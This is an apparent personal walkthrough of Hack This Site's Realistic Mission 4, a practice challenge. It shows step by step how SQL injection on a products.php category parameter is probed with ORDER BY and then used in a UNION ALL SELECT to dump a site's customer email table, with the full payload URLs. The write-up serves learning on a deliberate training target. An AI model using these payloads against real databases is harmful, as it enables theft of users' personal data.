# Mission 4
https://www.hackthissite.org/playlevel/4/

- [Overview](#overview)
- [Solution](#solution)
  * [Initial Observations](#initial-observations)
  * [Finding Another Weakness](#finding-another-weakness)
  * [Setting Up the UNION Attack](#setting-up-the-union-attack)
- [Key Concept](#key-concept)
- [Key Ideas](#key-ideas)

## Overview
FAP is a company that slaughters animals and turns their skin into overpriced products which are then sold to rich bastards! Help animal rights activists increase political awareness by hacking their mailing list.

From: SaveTheWhales

Message: Hello, I was referred to you by a friend who says you know how to hack into computers and web sites - well I was wondering if you could help me out here. There's this local store who is killing hundreds of animals a day exclusively for the purpose of selling jackets and purses etc out of their skin! I have been to their website and they have an email list for their customers. I was wondering if you could somehow hack in and send me every email address on that list? I want to send them a message letting them know of the murder they are wearing. Just reply to this message with a list of the email addresses. Please?

## Solution
### Initial Observations
The website we're targeting has a list of customer email addresses and we need to retrieve them. A list of email addresses almost certainly means we're dealing with a database, and we've seen databases are susceptible to SQL injection attacks. Without even seeing the site in detail it sounds like we have our attack vector. But keep in mind this seems different than the SQL injection tactic we used in [Realistic Mission 2](https://github.com/jasonally/hack_this_site_missions/blob/master/realistic/mission_02.md), where we used a SQL injection to bypass a login screen. This mission seems more about dumping a database's content.

The mission website has two pages with product contents, generated using some sort of PHP script (as evidenced by the products.php literal which appears in the URL structure when you open those pages, similar in some respects to pages in [Realistic Mission 3](https://github.com/jasonally/hack_this_site_missions/blob/master/realistic/mission_03.md)). On the main page, there's a form to fill out to sign up for the mailing list. Enter a string which looks like a valid email address, click add to list, and you get a message saying 'Email added successfully'.

I thought maybe the solution was similar to the one in Mission 2, so I tried some of the common SQL injections I found [here](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#ByPassingLoginScreens). None seemed to work, but I did get this error message: 'Error inserting into table "email"! Email not valid! Please contact an administrator of Fischer's'.

The error message never changed, so I concluded the solution wasn't as simple as putting the payload into the form box. But this message revealed an important detail: the table containing the email addresses we want is named email. If only there was somewhere I could run a SQL query like `SELECT * FROM email;` or `SELECT email FROM email;`, that would give me what I'm looking for.

### Finding Another Weakness
Since the mailing list form was a dead end, I went back to the two product listing pages, https://www.hackthissite.org/missions/realistic/4/products.php?category=1 and https://www.hackthissite.org/missions/realistic/4/products.php?category=2. That's when I realized these pages must be associated with another table. The category=1 and category=2 parts of the URLs are parameters for querying this second table. What happens if we give this table an invalid input, like a category value which doesn't exist? Ideally, I should get a 404 HTTP response.

I tried accessing https://www.hackthissite.org/missions/realistic/4/products.php?category=3 and a white page loaded. I didn't explicitly get a 404 response, so to confirm I opened developer tools, pulled open the network tab so I could view the flow of HTTP requests, and reloaded the page. Sure enough, I could see the document returned a 200 response code. In other words, we just gave the site an input it absolutely should have rejected as invalid, but it didn't. I then tried accessing https://www.hackthissite.org/missions/realistic/4/products.php?category=ABC and got a broken image icon in my response. Another promising sign!

Before going any further it's important to think about how this page loads, similar to what we did in Realistic Mission 2. The backend code clearly involves a SQL query again, and for a URL like https://www.hackthissite.org/missions/realistic/4/products.php?category=1, it's probably something like this:
```
page_category = getRequestString("category");

sql = "SELECT * FROM [products] WHERE Category ='" + page_category + "'"
```

We've got a URL where we can tamper with a SQL query, but this query is tied to the wrong table. We want email addresses in the email table, not whatever this table is. Fortunately, PortSwigger's [SQL injection](https://portswigger.net/web-security/sql-injection) content references multiple types of injections, including the [UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) which allows you to get data from different tables. I was already familiar with [UNION or UNION ALL](https://www.w3schools.com/sql/sql_ref_union.asp) commands through prior experience with SQL, but this seems relevant to the problem we're trying to solve. PortSwigger mentions, however, a successful UNION attack requires the individual queries to return the same number of columns. So we need to figure out how many columns are in both tables, products and email.

### Setting Up the UNION Attack
I saw hints that using the ORDER BY command would be helpful in learning about the products table schema. So I tried the following:
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1 loads the page as intended.
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%201%20DESC and https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%201%20DASC flips the sorting of the page contents according to the pictures. This suggests the image data type is the first column in the products table.
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%202%20DESC AND https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%202%20DASC didn't change the page contents. But there's a common string, 'A big hairy fur coat that is made of fuzzy cute animals that we mercilessly slaughtered' in each product description, so this means the product description is probably the second column. It's a string data type.
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%203%20DESC and https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%203%20ASC sorts by price. This means price is the third column, probably as a string, too.
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%20420DESC and https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%20420ASC didn't change any sorting again. But many SQL tables have an ID column, so maybe this is it.
* URLs containing https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%205 returned the broken image icon. I think that means there's no fifth column. The products table only has four columns, which makes sense.

As far as we know the email table only has one column, but we can fake more using NULL in our SELECT statement, like this: `SELECT email, NULL, NULL, NULL FROM email`.

I tried https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20UNION%20ALL%20SELECT%20email,%20null,%20null,%20null%20FROM%20email. The page loads with the usual page contents, but if you scroll down there are nine additional broken images. This seems close, but the issue now is the data types aren't right. If the first column of the products table is an image, SQL is expecting the first column of email to also be an image. The email column is a string, so we need that column to line up with another string column in the product table. The second column of the products table will do the trick. We need to change our SQL query to `SELECT NULL, email, NULL, NULL FROM email` or `SELECT NULL, NULL, email, NULL FROM email`.

Try https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20UNION%20ALL%20SELECT%20null,%20email,%20null,%20null%20FROM%20email or https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20UNION%20ALL%20SELECT%20null,%20null,%20email,%20null%20FROM%20email, and there are your email addresses. Copy them and message them to SaveTheWhales.

## Key Concept
SQL injection, specifically UNION attacks

## Key Ideas
This mission expanded on prior SQL injection knowledge. We've now seen an example of how SQL injections can help us retrieve data from other tables in a site's database. This is in addition to Realistic Mission 2, where we used a SQL injection to bypass a login screen.

This discovery came at the expense of realizing the mailing list signup functionality was a bit of a misdirection. By tampering with it we were able to learn the name of the table we were targeting, but eventually I realized I needed to try my fortunes elsewhere on the site. Realizing I could enter invalid inputs into the https://www.hackthissite.org/missions/realistic/4/products.php?category= made me realize I was onto something, even though I needed a few hints to properly sketch out what the solution entailed.